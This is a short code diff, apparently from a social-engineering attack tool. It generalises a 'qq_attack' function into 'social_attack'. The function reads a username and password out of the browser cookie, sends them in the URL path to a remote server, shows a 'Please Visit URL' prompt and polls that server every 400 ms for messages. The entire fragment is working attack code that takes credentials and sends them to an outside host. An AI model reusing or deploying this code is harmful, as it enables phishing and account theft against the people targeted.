@@ -5,15 +5,30 @@ function to_social() {
     i.src = "./socialEngine";
 }
 
-function qq_attack() {
+function social_attack(attack_type) {
     var user = JSON.parse(document.cookie).user;
     var pwd = JSON.parse(document.cookie).pwd;
     var xhr = new XMLHttpRequest();
-    xhr.open("GET",remote+"/api/qq/"+user+"/"+pwd,true);
+    xhr.open("GET",remote+"/api/"+attack_type+"/"+user+"/"+pwd,true);
     xhr.send();
     xhr.onload=function(){
         if (xhr.readyState === 4) {
-            showAlert(xhr.response , null)
+            var response = xhr.responseText;
+            showAlert('Please Visit URL: ' + remote + '/'+response , null)
+
+            var run = setInterval(function() {
+                var get_message = new XMLHttpRequest();
+                get_message.open('GET',remote+"/run/"+response , true);
+                get_message.send();
+                get_message.onload = function() {
+                    if (get_message.readyState === 4) {
+                        var r = get_message.responseText;
+                        if (r.replace('\n','') != 'none') {
+                            showAlert(r , null)
+                        }
+                    }
+                }
+            } , 400);
         }
     }
 }
